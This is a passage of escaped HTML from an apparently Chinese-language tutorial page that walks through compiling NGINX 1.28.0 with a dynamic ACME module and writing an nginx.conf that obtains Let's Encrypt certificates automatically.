NGINX 源码（请替换为您需要的版本）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewget https://nginx.org/download/nginx-1.28.0.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etar -zxf nginx-1.28.0.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"compile\"\u003ecompile\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd nginx-1.28.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./configure \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --prefix\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --error-log-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/error.log \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-log-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/access.log \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --pid-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/nginx.pid \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --lock-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/nginx.lock \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-client-body-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/client_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-proxy-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/proxy_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-fastcgi-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/fastcgi_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-uwsgi-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/uwsgi_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-scgi-temp-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/cache/scgi_temp \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --user\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enginx \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --group\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enginx \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-compat \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-file-aio \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-threads \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_addition_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_auth_request_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_dav_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_flv_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_gunzip_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_gzip_static_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_mp4_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_random_index_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_realip_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_secure_link_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_slice_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_ssl_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_stub_status_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_sub_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_v2_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-http_v3_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-mail \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-mail_ssl_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-stream \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-stream_realip_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-stream_ssl_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-stream_ssl_preread_module \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-cc-opt\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;-g -O2 -ffile-prefix-map=/home/builder/debuild/nginx-1.28.0/debian/debuild-base/nginx-1.28.0=. -fstack-protector-strong -Wformat -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 -fPIC\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --with-ld-opt\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;-Wl,-z,relro -Wl,-z,now -Wl,--as-needed -pie\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --add-dynamic-module\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx-build/nginx-acme\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    make modules \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    make install\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 运行配置脚本，这里的关键是 --add-dynamic-module\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 注意：您需要在这里包含您当前 NGINX 已有的所有编译参数，可以通过 nginx -V 查看\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 编译模块，注意是 make modules 而不是 make install\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"config\"\u003econfig\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# /app/nginx/conf/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003euser\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enginx\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eerror_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eerror.log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003edebug\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epid\u003c/span\u003e        \u003cspan style=\"color:#e6db74\"\u003enginx.pid\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eload_module\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emodules/ngx_http_acme_module.so\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eevents\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eworker_connections\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003emulti_accept\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ehttp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e       \u003cspan style=\"color:#e6db74\"\u003emime.types\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eapplication/octet-stream\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elog_format\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003emain\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$remote_addr \u003cspan style=\"color:#e6db74\"\u003e-\u003c/span\u003e $remote_user \u003cspan style=\"color:#e6db74\"\u003e[\u003c/span\u003e$time_local] \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$host\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$request\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$status $body_bytes_sent \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_referer\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e$http_user_agent\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_x_forwarded_for\u0026#34;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eaccess.log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003emain\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003esendfile\u003c/span\u003e       \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003etcp_nopush\u003c/span\u003e     \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003echarset\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eutf-8\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ekeepalive_timeout\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003egzip\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eresolver\u003c/span\u003e 8.8.8.8 1.1.1.1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 定义一个名为 letsencrypt 的 ACME 颁发机构实例\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eacme_issuer\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eletsencrypt\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 指定 ACME 服务提供商的目录 URL，这里是 Let\u0026#39;s Encrypt 的生产环境\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003euri\u003c/span\u003e         \u003cspan style=\"color:#e6db74\"\u003ehttps://acme-v02.api.letsencrypt.org/directory\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 提供一个联系邮箱，用于接收 CA 的重要通知（如证书即将过期）\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003econtact\u003c/span\u003e     \u003cspan style=\"color:#e6db74\"\u003emailto:security-alerts@aidig.co\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 指定状态文件的存储路径，用于保存 ACME 账户密钥，非常重要\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003estate_path\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eacme/letsencrypt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 同意服务条款，对于 Let\u0026#39;s Encrypt 等 CA 这是必需的步骤\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eaccept_terms_of_service\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 可选指令 acme_shared_zone，用于存储所有配置的证书颁发者的证书、私钥和挑战数据。该区域默认大小为 256K，可根据需要增加\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eacme_shared_zone\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezone=acme_shared:1M\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e443\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl.aidig.co\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 步骤一：声明此 server 块启用 ACME，并指定使用上面定义的 letsencrypt 颁发机构\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eacme_certificate\u003c/span\u003e    \u003cspan style=\"color:#e6db74\"\u003eletsencrypt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 步骤二：使用动态变量加载由 ACME 模块在内存中管理的证书和私钥\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e     $acme_certificate;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e   $acme_certificate_key;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate_cache\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003emax=2\u003c/span\u003e;  \u003cspan style=\"color:#75715e\"\u003e# required ngx 1.27.4+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/plain\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;OK\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 